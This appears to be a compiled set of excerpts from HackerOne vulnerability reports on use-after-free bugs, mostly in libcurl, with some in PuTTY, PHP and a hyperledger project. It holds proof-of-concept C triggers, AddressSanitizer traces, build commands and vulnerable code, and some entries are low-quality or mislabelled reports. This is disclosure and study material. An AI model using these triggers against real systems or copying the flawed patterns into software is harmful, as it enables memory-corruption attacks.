          struct timespec remaining, request = { 0, 60000000 };
          // We should do a select, but let's just wait for timeout for reproducibility
          nanosleep(&request, &remaining);
          curl_multi_perform(multi_handle, &still_running);
    }
    curl_multi_remove_handle(multi_handle, curl);
    curl_multi_cleanup(multi_handle);
    curl_easy_cleanup(curl);
  }
  return 0;
}
```

```
* Added connection 0. The cache now contains 1 members
* Resolving timed out after 61 milliseconds
* Curl_disconnect(conn #0, aborted=1)
* closing connection #0
=================================================================
==47284==ERROR: AddressSanitizer: heap-use-after-free on address 0x622000003148 at pc 0x00010e3a3397 bp 0x7ff7b25cf1c0 sp 0x7ff7b25cf1b8
READ of size 4 at 0x622000003148 thread T0
    #0 0x10e3a3396 in Curl_node_elem llist.c:248
    #1 0x10e3c5cba in curl_multi_perform multi.c:2604
    #2 0x10d931c46 in main pocuaf.c:29
    #3 0x7ff8011a4344 in start+0x774 (dyld:x86_64+0xfffffffffff5c344)

0x622000003148 is located 72 bytes inside of 5760-byte region [0x622000003100,0x622000004780)
freed by thread T0 here:
    #0 0x10ecacdb6 in free+0xa6 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe0db6)
    #1 0x10e3a47fd in curl_dbg_free memdebug.c:297
    #2 0x10e436f30 in Curl_close url.c:337
    #3 0x10e31d12a in Curl_doh_close doh.c:1305
    #4 0x10e3e5ea4 in Curl_req_done request.c:110
    #5 0x10e3c2308 in multi_done multi.c:597
    #6 0x10e3ce6ff in multi_handle_timeout multi.c:1583
    #7 0x10e3c72d3 in multi_runsingle multi.c:2242
    #8 0x10e3c5c8e in curl_multi_perform multi.c:2620
    #9 0x10d931c46 in main pocuaf.c:29
    #10 0x7ff8011a4344 in start+0x774 (dyld:x86_64+0xfffffffffff5c344)

previously allocated by thread T0 here:
    #0 0x10ecad042 in calloc+0xa2 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe1042)
    #1 0x10e3a424d in curl_dbg_calloc me
```

## #2779070 Memory Leak in bytes_to_hexstring Function — hyperledger — - — Use After Free
Source: `hackerone/reports/2024/2779070.md` (https://hackerone.com/reports/2779070)

```
char* bytes_to_hexstring(uint8_t* bytes, size_t len)
{
    const char* hexdigs = "0123456789abcdef";
    size_t k = len * 2 + 1;
    char* out = malloc(k);
    for (int i = 0; i < len; i++)
    {
        out[i * 2] = hexdigs[bytes[i] >> 4];
        out[i * 2 + 1] = hexdigs[bytes[i] & 0x0f];
    }
    out[k - 1] = '\0';
    return out;
}
```

```
for (int i = 0; i < 10000; i++) {
    uint8_t data[10] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09};
    char* hex_str = bytes_to_hexstring(data, 10);
    // Do something with hex_str but forget to free it
}
```

```
char* hex_str = bytes_to_hexstring(data, len);
// Use hex_str...
free(hex_str); // Ensure that the allocated memory is freed
```

## #3774279 heap-use-after-free in state.referer when CURLOPT_REFERER replaced or cleared after perform — curl — - — Use After Free
Source: `hackerone/reports/2026/3774279.md` (https://hackerone.com/reports/3774279)

```
curl 8.14.0-DEV (x86_64-pc-linux-gnu) libcurl/8.14.0-DEV OpenSSL/3.5.0 zlib/1.3.1
Built with ASAN+UBSan: -fsanitize=address,undefined -O0 -g
```

```
git clone https://github.com/curl/curl.git && cd curl
cmake -S . -B build \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O0" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
  -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address,undefined" \
  -DCURL_USE_OPENSSL=ON -DBUILD_SHARED_LIBS=ON \
  -DBUILD_TESTING=OFF -DBUILD_CURL_EXE=OFF
cmake --build build -j --target libcurl_shared
```

```
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
static size_t devnull(void *p, size_t s, size_t n, void *u){(void)p;(void)u;return s*n;}
int main(void){
    CURL *curl; const char *ref = NULL;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "file:///dev/null");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, devnull);
    curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/secret-A");
    curl_easy_perform(curl);
    /* frees old copy; state.referer dangles */
    curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/B");
    curl_easy_getinfo(curl, CURLINFO_REFERER, &ref);
    if(ref) printf("strlen=%zu\n", strlen(ref)); /* UAF read */
    curl_easy_cleanup(curl);
    curl_global_cleanup();
}
```

## #481532 heap-use-after-free (READ of size 8) in main() — putty_h1c — - — Use After Free
Source: `hackerone/reports/2019/481532.md` (https://hackerone.com/reports/481532)

```
CC=clang CXX=clang++ CFLAGS=-fsanitize=address CXXFLAGS=-fsanitize=address ./configure --without-gtk && make --j2
```

```
==24482==ERROR: AddressSanitizer: heap-use-after-free on address 0x604000000018 at pc 0x0000004f9271 bp 0x7ffe82ceee30 sp 0x7ffe82ceee28
READ of size 8 at 0x604000000018 thread T0
    #0 0x4f9270 in main /root/putty-0.70-2019-01-17.53747ad/cmdgen.c:979:45
    #1 0x7f019934a2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #2 0x41db89 in _start (/root/putty-0.70-2019-01-17.53747ad/puttygen+0x41db89)

0x604000000018 is located 8 bytes inside of 48-byte region [0x604000000010,0x604000000040)
freed by thread T0 here:
    #0 0x4c5fb2 in __interceptor_free /b/swarming/w/ir/kitchen-workdir/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3
    #1 0x4f7e68 in main /root/putty-0.70-2019-01-17.53747ad/cmdgen.c:819:21
    #2 0x7f019934a2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)

previously allocated by thread T0 here:
    #0 0x4c6333 in malloc /b/swarming/w/ir/kitchen-workdir/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3
    #1 0x51971d in safemalloc /root/putty-0.70-2019-01-17.53747ad/memory.c:23:6
    #2 0x5bf67f in strbuf_new /root/putty-0.70-2019-01-17.53747ad/utils.c:431:31
    #3 0x4f7a4e in main /root/putty-0.70-2019-01-17.53747ad/cmdgen.c:809:28
    #4 0x7f019934a2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)

SUMMARY: AddressSanitizer: heap-use-after-free /root/putty-0.70-2019-01-17.53747ad/cmdgen.c:979:45 in main
```

```
    #0 0x4f9270 in main /root/putty-0.70-2019-01-17.53747ad/cmdgen.c:979:45
    #1 0x7f019934a2e0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202e0)
    #2 0x41db89 in _start (/root/putty-0.70-2019-01-17.53747ad/puttygen+0x41db89)
```

## #3261310 OpenSSL HTTP/3 bogus CURLINFO_TLS_SSL_PTR — curl — - — Use After Free
Source: `hackerone/reports/2025/3261310.md` (https://hackerone.com/reports/3261310)

```
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <stdio.h>

static size_t header_callback(char *buffer, size_t size,
                              size_t nitems, void *userdata)
{
  size_t actual = nitems * size;
  CURL *curl = (CURL *) userdata;
  size_t printactual = actual;

  if (printactual && buffer[printactual - 1] == '\n')
  {
    printactual--;
    if (printactual && buffer[printactual - 1] == '\r')
      printactual--;
  }
  printf("H: %.*s\n", (int) printactual, buffer);

  if ((actual == 1 && buffer[0] == '\n') ||
      (actual == 2 && buffer[0] == '\r' && buffer[1] == '\n'))
  {
    const struct curl_tlssessioninfo *info = NULL;
    CURLcode res = curl_easy_getinfo(curl, CURLINFO_TLS_SSL_PTR, &info);
    printf("D: headers completed, res %d info %p\n", res, info);
    if (info && !res)
    {
      printf("D: backend %d internals %p\n", info->backend,  info->internals);
      if(CURLSSLBACKEND_OPENSSL == info->backend)
      {
        SSL *ssl = info->internals;
        printf("D: OpenSSL ver. %s\n", SSL_get_version(ssl));
        STACK_OF(X509)* chain = SSL_get_peer_cert_chain(ssl);
        printf("D: chain %p\n", chain);
      }
    }
  }
  return actual;
}

int main(void)
{
  printf("libcurl version: %s\n", curl_version());

  CURL *curl = curl_easy_init();
  if (curl)
  {
    curl_easy_setopt(curl, CURLOPT_URL, "https://curl.se");
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_3ONLY);
    curl_easy_setopt(curl, CURLOPT_HEADERF
```

```
$ ./curlpoc
libcurl version: libcurl/8.15.1-DEV OpenSSL/3.5.1 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 nghttp2/1.66.0 ngtcp2/1.14.0-DEV nghttp3/1.1 OpenLDAP/2.6.10
H: HTTP/3 200
H: content-length: 11441
H: server: nginx/1.27.5
H: content-type: text/html
H: x-frame-options: SAMEORIGIN
H: last-modified: Sun, 20 Jul 2025 02:11:09 GMT
H: etag: "2cb1-63a52df596e87"
H: cache-control: max-age=60
H: expires: Sun, 20 Jul 2025 02:14:40 GMT
H: x-content-type-options: nosniff
H: content-security-policy: default-src 'self' curl.haxx.se www.curl.se curl.se; style-src 'unsafe-inline' 'self' curl.haxx.se www.curl.se curl.se; require-trusted-types-for 'script';
H: strict-transport-security: max-age=31536000
H: via: 1.1 varnish, 1.1 varnish
H: accept-ranges: bytes
H: date: Sun, 20 Jul 2025 04:44:47 GMT
H: age: 69
H: x-served-by: cache-bma-essb1270054-BMA, cache-hel1410021-HEL
H: x-cache: HIT, HIT
H: x-cache-hits: 1, 15
H: x-timer: S1752986688.638651,VS0,VE0
H: vary: Accept-Encoding
H: alt-svc: h3=":443";ma=86400,h3-29=":443";ma=86400,h3-27=":443";ma=86400
H:
D: headers completed, res 0 info 0x622000010600
D: backend 1 internals 0x61c000001080
D: OpenSSL ver. unknown
AddressSanitizer:DEADLYSIGNAL
=================================================================
==81895==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000005c9 (pc 0x00010472785c bp 0x00016b6ed690 sp 0x00016b6ed690 T0)
==81895==The signal is caused by a READ memory access.
==81895==Hint: address point
```

```
                              size_t nitems, void *userdata)
```

## #3516202 Cookie Replacement Use-After-Free Vulnerability — curl — - — Use After Free
Source: `hackerone/reports/2026/3516202.md` (https://hackerone.com/reports/3516202)

```
static bool replace_existing(struct Curl_easy *data,
                             struct Cookie *co,
                             struct CookieInfo *ci,
                             bool secure,
                             bool *replacep)
{
    bool replace_old = FALSE;
    struct Curl_llist_node *replace_n = NULL;
    struct Curl_llist_node *n;
    
    // Iterate over cookie list
    for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {
        struct Cookie *clist = Curl_node_elem(n);
        // ... comparison logic ...
        if(replace_old)
            replace_n = n;  // Store node for later deletion
    }
    
    // Delete node after iteration
    if(replace_n) {
        struct Cookie *repl = Curl_node_elem(replace_n);
        co->creationtime = repl->creationtime;  // Access freed memory
        Curl_node_remove(replace_n);
        freecookie(repl, TRUE);  // Free memory
    }
}
```

```
# Run the PoC server
python3 poc_cookie_uaf.py

# Server starts on http://localhost:8000
# Provides 3 different exploit scenarios
```

```
cd curl
export CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g"
export LDFLAGS="-fsanitize=address"
./buildconf
./configure --enable-debug --disable-shared
make clean
make
```

## #3452725 Title: Use-After-Free in cURL Test Suite via Improper Cleanup of Global Handle — curl — - — Use After Free
Source: `hackerone/reports/2025/3452725.md` (https://hackerone.com/reports/3452725)

```
/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ <| |___
 *                             \___|\___/|_| \_\_____|
 *
 * Copyright (C) Daniel Stenberg, <daniel@haxx.se>, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution. The terms
 * are also available at https://curl.se/docs/copyright.html.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 * SPDX-License-Identifier: curl
 *
 ***************************************************************************/
/*
 * Verify that some API functions are locked from being called inside callback
 */

#include "first.h"

static CURL *t1555_curl;

static int progressCallback(void *arg,
                            double dltotal,
                            double dlnow,
                            double ultotal,
                            double ulnow)
{
  CURLcode res = CURLE_OK;
  char buffer[256];
  size_t n = 0;
  (void)arg;
  (void)dltotal;
  (void)dlnow;
  
```

```
if (t1555_curl) {
    curl_easy_cleanup(t1555_curl);
    t1555_curl = NULL;
}
```

```
static CURLcode test_lib1555(const char *URL)
{
  CURLcode res = CURLE_OK;

  global_init(CURL_GLOBAL_ALL);

  easy_init(t1555_curl);  /* Line: Handle initialization */

  /* ... configuration ... */

  res = curl_easy_perform(t1555_curl);

test_cleanup:

  /* undocumented cleanup sequence - type UA */
  
  curl_easy_cleanup(t1555_curl);  /* LINE 83: FREES THE HANDLE */
  curl_global_cleanup();

  return res;  /* BUG: t1555_curl IS NOT SET TO NULL AFTER cleanup! */
}
```

## #3302518 ## Title  Heap Use-After-Free Vulnerability in `curl` Leading to Potential Code Execution — curl — - — Use After Free
Source: `hackerone/reports/2025/3302518.md` (https://hackerone.com/reports/3302518)

```
if(data->set.errorbuffer && !data->state.errorbuf) {
   strcpy(data->set.errorbuffer, error); 
   data->state.errorbuf = TRUE; /* wrote error string */ 
}
```

```
mkdir build && cd build
CC=clang CXX=clang++ cmake ..   -DCMAKE_BUILD_TYPE=Debug   -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address"   -DBUILD_SHARED_LIBS=OFF   -DBUILD_STATIC_LIBS=ON   -DBUILD_TESTING=OFF   -DBUILD_EXAMPLES=OFF   -DENABLE_MANUAL=OFF
cmake --build . --config Debug
```

```
clang++ -g -O1 -fsanitize=address,fuzzer   -I../include   -I../src/include   vulnerablityfuzz.cpp ./lib/libcurl-d.a -o vulfuzz   -lpsl -ldl -lpthread -lssl -lcrypto -lz
```

## #3824303 UAF read in mev_pollset_diff() trace path after curl_easy_pause() in socket callback — curl — - — Use After Free
Source: `hackerone/reports/2026/3824303.md` (https://hackerone.com/reports/3824303)

```
mresult = mev_sh_entry_update(multi, data, entry, s,
                              prev_ps->actions[i], 0);
if(mresult)
  return mresult;
/* the callback may have freed this entry via curl_easy_pause(); re-fetch */
entry = mev_sh_entry_get(&multi->ev.sh_entries, s);
if(entry)
  CURL_TRC_M(data, "ev entry fd=%" FMT_SOCKET_T ", removed transfer, "
             "total=%u/%d (xfer/conn)", s,
             Curl_uint32_spbset_count(&entry->xfers),
             entry->conn ? 1 : 0);
```

```
                              prev_ps->actions[i], 0);
```

```
             "total=%u/%d (xfer/conn)", s,
             Curl_uint32_spbset_count(&entry->xfers),
             entry->conn ? 1 : 0);
```

## #4033971 Use-after-free of the internal multi->admin easy handle via the documented CURLMOPT_NOTIFYFUNCTION callback — curl — - — Use After Free
Source: `hackerone/reports/2026/4033971.md` (https://hackerone.com/reports/4033971)

```
    curl 8.22.0 (Linux) libcurl/8.22.0
    Release-Date: 2026-09-02
    Protocols: dict file ftp gopher http imap ipfs ipns mqtt pop3 rtsp smtp telnet tftp ws
    Features: alt-svc AsynchDNS IPv6 Largefile threadsafe UnixSockets
```

## #3355213 Use-after-free when POST body buffer is freed before transfer — curl — - — Use After Free
Source: `hackerone/reports/2025/3355213.md` (https://hackerone.com/reports/3355213)

```
     cmake -S . -B build-asan \
       -DCMAKE_BUILD_TYPE=RelWithDebInfo \
       -DBUILD_SHARED_LIBS=ON \
       -DCURL_USE_LIBPSL=OFF \
       -DCMAKE_C_FLAGS='-fsanitize=address -fno-omit-frame-pointer' \
       -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address' \
       -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address'
     cmake --build build-asan -j 8
     
```

```
     python3 -m http.server 18080 --bind 127.0.0.1 &
     
```

```
     #include <curl/curl.h>
     #include <stdlib.h>
     #include <string.h>
     #include <stdio.h>

     int main(void) {
       curl_global_init(CURL_GLOBAL_DEFAULT);
       CURL *h = curl_easy_init();
       if(!h) return 1;

       const char *url = "http://127.0.0.1:18080/";
       curl_easy_setopt(h, CURLOPT_URL, url);
       curl_easy_setopt(h, CURLOPT_VERBOSE, 1L);
       curl_easy_setopt(h, CURLOPT_CONNECTTIMEOUT_MS, 2000L);
       curl_easy_setopt(h, CURLOPT_TIMEOUT_MS, 3000L);

       const char payload[] = "test data";
       size_t n = sizeof(payload) - 1;

       char *cp = (char*)malloc(n);
       memcpy(cp, payload, n);

       curl_easy_setopt(h, CURLOPT_POSTFIELDSIZE, (long)n);
       curl_easy_setopt(h, CURLOPT_POSTFIELDS, cp);

       free(cp); // use-after-free when libcurl sends the request body

       CURLcode res = curl_easy_perform(h);
       fprintf(stderr, "perform result: %d\n", (int)res);

       curl_easy_cleanup(h);
       curl_global_cleanup();
       return 0;
     }
     
```

## #3264469 Use after free (or assert triggered) with failed allocations in openssl — curl — - — Use After Free
Source: `hackerone/reports/2025/3264469.md` (https://hackerone.com/reports/3264469)

```
failed malloc(32) 
    #0 0x561a08afee21 in __sanitizer_print_stack_trace /src/llvm-project/compiler-rt/lib/asan/asan_stack.cpp:87:3
    #1 0x561a08b33df2 in nalloc_backtrace_exclude(unsigned long, char const*) /src/curl_fuzzer/nallocinc.c:250:9
    #2 0x561a08b33df2 in nalloc_fail(unsigned long, char const*) /src/curl_fuzzer/nallocinc.c:278:13
    #3 0x561a08b3416e in malloc /src/curl_fuzzer/nallocinc.c:342:9
    #4 0x561a090ff417 in CRYPTO_malloc /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/mem.c:211:11
    #5 0x561a090ff417 in CRYPTO_zalloc /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/mem.c:231:11
    #6 0x561a09192f2a in sk_reserve /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/stack/stack.c:199:25
    #7 0x561a091934a8 in OPENSSL_sk_insert /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/stack/stack.c:269:10
    #8 0x561a090f75da in numname_insert /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:237:10
    #9 0x561a090f75da in namemap_add_name /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:267:19
    #10 0x561a090f8716 in ossl_namemap_add_name /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:302:18
    #11 0x561a090f8716 in get_legacy_evp_names /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:406:15
    #12 0x561a090efb56 in doall_util_fn /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/lhash/lhash.c:208:17
    
```

```
=================================================================
==23==ERROR: AddressSanitizer: heap-use-after-free on address 0x50700001f528 at pc 0x55df6b54ed4a bp 0x7ffcfa45d090 sp 0x7ffcfa45d088
READ of size 8 at 0x50700001f528 thread T0
SCARINESS: 51 (8-byte-read-heap-use-after-free)
    #0 0x55df6b54ed49 in EVP_DigestUpdate /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/evp/digest.c:390:15
    #1 0x55df6b150692 in Curl_HMAC_init /src/curl/lib/hmac.c:92:5
    #2 0x55df6b150ccb in Curl_hmacit /src/curl/lib/hmac.c:154:5
    #3 0x55df6b1876a8 in Curl_output_aws_sigv4 /src/curl/lib/http_aws_sigv4.c:925:3
    #4 0x55df6b1587ce in output_auth_headers /src/curl/lib/http.c:639:14
    #5 0x55df6b158366 in Curl_http_output_auth /src/curl/lib/http.c:819:14
    #6 0x55df6b151db2 in Curl_http /src/curl/lib/http.c:2736:14
    #7 0x55df6b045613 in multi_do /src/curl/lib/multi.c:1649:14
    #8 0x55df6b045613 in state_do /src/curl/lib/multi.c:2042:14
    #9 0x55df6b045613 in multi_runsingle /src/curl/lib/multi.c:2476:12
    #10 0x55df6b0427b4 in curl_multi_perform /src/curl/lib/multi.c:2739:18
    #11 0x55df6aff1543 in fuzz_handle_transfer(fuzz_data*) /src/curl_fuzzer/curl_fuzzer.cc:348:3
    #12 0x55df6aff091d in LLVMFuzzerTestOneInput /src/curl_fuzzer/curl_fuzzer.cc:103:3
    #13 0x55df6aea4660 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #14 0x55df6aea3e85 in fuzzer::Fuzzer::RunO
```

```
    #0 0x561a08afee21 in __sanitizer_print_stack_trace /src/llvm-project/compiler-rt/lib/asan/asan_stack.cpp:87:3
    #1 0x561a08b33df2 in nalloc_backtrace_exclude(unsigned long, char const*) /src/curl_fuzzer/nallocinc.c:250:9
    #2 0x561a08b33df2 in nalloc_fail(unsigned long, char const*) /src/curl_fuzzer/nallocinc.c:278:13
    #3 0x561a08b3416e in malloc /src/curl_fuzzer/nallocinc.c:342:9
    #4 0x561a090ff417 in CRYPTO_malloc /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/mem.c:211:11
    #5 0x561a090ff417 in CRYPTO_zalloc /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/mem.c:231:11
    #6 0x561a09192f2a in sk_reserve /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/stack/stack.c:199:25
    #7 0x561a091934a8 in OPENSSL_sk_insert /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/stack/stack.c:269:10
    #8 0x561a090f75da in numname_insert /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:237:10
    #9 0x561a090f75da in namemap_add_name /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:267:19
    #10 0x561a090f8716 in ossl_namemap_add_name /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:302:18
    #11 0x561a090f8716 in get_legacy_evp_names /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/core_namemap.c:406:15
    #12 0x561a090efb56 in doall_util_fn /src/curl_fuzzer/build/openssl/src/openssl_external/crypto/lhash/lhash.c:208:17
    #13 0x561a090efb56 
```

## #3916059 CVE-2026-18924: HTTP/2 server push UAF — curl — - — Use After Free
Source: `hackerone/reports/2026/3916059.md` (https://hackerone.com/reports/3916059)

```
cmake -S . -B build -DCMAKE_BUILD_TYPE=RelWithDebInfo -DENABLE_DEBUG=OFF \
  -DBUILD_SHARED_LIBS=OFF -DBUILD_CURL_EXE=OFF -DBUILD_TESTING=OFF \
  -DCURL_USE_OPENSSL=OFF -DUSE_NGHTTP2=ON -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF \
  -DCURL_BROTLI=OFF -DCURL_ZSTD=OFF \
  -DCMAKE_C_FLAGS="-fsanitize=address -g -fno-omit-frame-pointer"
cmake --build build && cmake --install build

cc -fsanitize=address -g repro.c -o repro -I<prefix>/include \
   <prefix>/lib/libcurl.a -lnghttp2 -lz -lpthread -ldl
ASAN_OPTIONS=detect_leaks=0 ./repro
```

```
READ of size 8:
  Curl_node_elem            lib/llist.c:237
  cpool_get_first           lib/conncache.c:142
  Curl_cpool_destroy        lib/conncache.c:242
  share_destroy             lib/curl_share.c:41
  curl_share_cleanup        lib/curl_share.c:370

freed by:
  Curl_cshutdn_terminate    lib/cshutdn.c:159
  cpool_discard_conn        lib/conncache.c:226
  Curl_conn_terminate       lib/conncache.c:692
  Curl_cpool_do_locked      lib/conncache.c:833
  multi_done                lib/multi.c:750
  multi_handle_timeout      lib/multi.c:1848
  multi_runsingle           lib/multi.c:2757
  multi_perform             lib/multi.c:2888

previously allocated by:
  allocate_conn             lib/url.c:1182
  url_create_needle         lib/url.c:2010
  url_find_or_create_conn   lib/url.c:2250
  Curl_connect              lib/url.c:2456
```

```
CURLSH *sh = curl_share_init();
curl_share_setopt(sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);
curl_easy_setopt(easy, CURLOPT_SHARE, sh);
curl_multi_setopt(multi, CURLMOPT_PUSHFUNCTION, push_cb);  /* returns CURL_PUSH_OK */
```

## #371135 CVE-2018-12882: heap-use-after-free in PHP 7.2 through 7.2.6, possible 7.2.7 — ibb — - — Use After Free
Source: `hackerone/reports/2018/371135.md` (https://hackerone.com/reports/371135)

```
USE_ZEND_ALLOC=0 ./php-e147eb2 -r 'exif_read_data(file_get_contents("/full/path/to/test.jpg"));'

echo "Lw==" | base64 -d > test.jpg

od -tx1 test.jpg
0000000 2f
0000001
```

```
==15865==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000000ad0 at pc 0x0000013d8100 bp 0x7fff9778bda0 sp 0x7fff9778bd98
READ of size 8 at 0x611000000ad0 thread T0
    #0 0x13d80ff in _php_stream_free /root/php-7.2.6/main/streams/streams.c:373:13
    #1 0xe4a08f in exif_read_from_file /root/php-7.2.6/ext/exif/exif.c:4411:2
    #2 0xe4a08f in zif_exif_read_data /root/php-7.2.6/ext/exif/exif.c:4482
    #3 0x18692f5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /root/php-7.2.6/Zend/zend_vm_execute.h:573:2
    #4 0x1683367 in execute_ex /root/php-7.2.6/Zend/zend_vm_execute.h:59723:7
    #5 0x1683aa5 in zend_execute /root/php-7.2.6/Zend/zend_vm_execute.h:63760:2
    #6 0x14fdb5c in zend_eval_stringl /root/php-7.2.6/Zend/zend_execute_API.c:1082:4
    #7 0x14fe3a7 in zend_eval_stringl_ex /root/php-7.2.6/Zend/zend_execute_API.c:1123:11
    #8 0x14fe3a7 in zend_eval_string_ex /root/php-7.2.6/Zend/zend_execute_API.c:1134
    #9 0x196fd32 in do_cli /root/php-7.2.6/sapi/cli/php_cli.c:1042:8
    #10 0x196dd4f in main /root/php-7.2.6/sapi/cli/php_cli.c:1404:18
    #11 0x7fb432b3382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #12 0x43bd68 in _start (/root/php-7.2.6/sapi/cli/php+0x43bd68)

0x611000000ad0 is located 144 bytes inside of 224-byte region [0x611000000a40,0x611000000b20)
freed by thread T0 here:
    #0 0x4e2c32 in free /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cc:78:3
 
```

```
    #0 0x13d80ff in _php_stream_free /root/php-7.2.6/main/streams/streams.c:373:13
    #1 0xe4a08f in exif_read_from_file /root/php-7.2.6/ext/exif/exif.c:4411:2
    #2 0xe4a08f in zif_exif_read_data /root/php-7.2.6/ext/exif/exif.c:4482
    #3 0x18692f5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /root/php-7.2.6/Zend/zend_vm_execute.h:573:2
    #4 0x1683367 in execute_ex /root/php-7.2.6/Zend/zend_vm_execute.h:59723:7
    #5 0x1683aa5 in zend_execute /root/php-7.2.6/Zend/zend_vm_execute.h:63760:2
    #6 0x14fdb5c in zend_eval_stringl /root/php-7.2.6/Zend/zend_execute_API.c:1082:4
    #7 0x14fe3a7 in zend_eval_stringl_ex /root/php-7.2.6/Zend/zend_execute_API.c:1123:11
    #8 0x14fe3a7 in zend_eval_string_ex /root/php-7.2.6/Zend/zend_execute_API.c:1134
    #9 0x196fd32 in do_cli /root/php-7.2.6/sapi/cli/php_cli.c:1042:8
    #10 0x196dd4f in main /root/php-7.2.6/sapi/cli/php_cli.c:1404:18
    #11 0x7fb432b3382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #12 0x43bd68 in _start (/root/php-7.2.6/sapi/cli/php+0x43bd68)
```

## #3823985 Use-after-free in `mev_forget_socket` when `curl_easy_pause()` is called from a `CURL_POLL_REMOVE` socket callback (incomplete fix of CVE-2026-9080) — curl — - — Use After Free
Source: `hackerone/reports/2026/3823985.md` (https://hackerone.com/reports/3823985)

```
static CURLMcode mev_forget_socket(struct Curl_multi *multi,
                                   struct Curl_easy *data,
                                   curl_socket_t s, const char *cause)
{
  struct mev_sh_entry *entry = mev_sh_entry_get(&multi->ev.sh_entries, s);  // 202
  ...
  if(entry->announced && multi->socket_cb) {
    mev_in_callback(multi, TRUE);
    rc = multi->socket_cb(data, s, CURL_POLL_REMOVE,
                          multi->socket_userp, entry->user_data);          // 213  callback
    mev_in_callback(multi, FALSE);
    entry->announced = FALSE;                                              // 216  <-- UAF
  }
  mev_sh_entry_kill(multi, s);                                             // 219
  ...
}
```

```
/* ... the callback ... re-enters mev_assess() which may free this 'entry'. Re-fetch. */
entry = mev_sh_entry_get(&multi->ev.sh_entries, s);   // 294  (the CVE-2026-9080 fix)
```

```
heap-use-after-free  READ of size 1
  #0 mev_forget_socket        lib/multi_ev.c:216
  #1 socket_close             lib/cf-socket.c
  #2 cf_tcp_connect           lib/cf-socket.c:1435
  #3 cf_ip_attempt_connect    lib/cf-ip-happy.c:252   (Happy-Eyeballs closing a losing socket)
  #6 cf_ip_happy_connect      lib/cf-ip-happy.c:880
  #14 multi_socket            lib/multi.c:3302
  #15 main                    uaf_repro.c               (curl_multi_socket_action)
```

## #3833577 heap-use-after-free in curl_easy_cleanup() called from callback — curl — - — Use After Free
Source: `hackerone/reports/2026/3833577.md` (https://hackerone.com/reports/3833577)

```
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV OpenSSL/3.5.6 zlib/1.3.1
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

static CURL *g_easy;
static int cleanup_done;

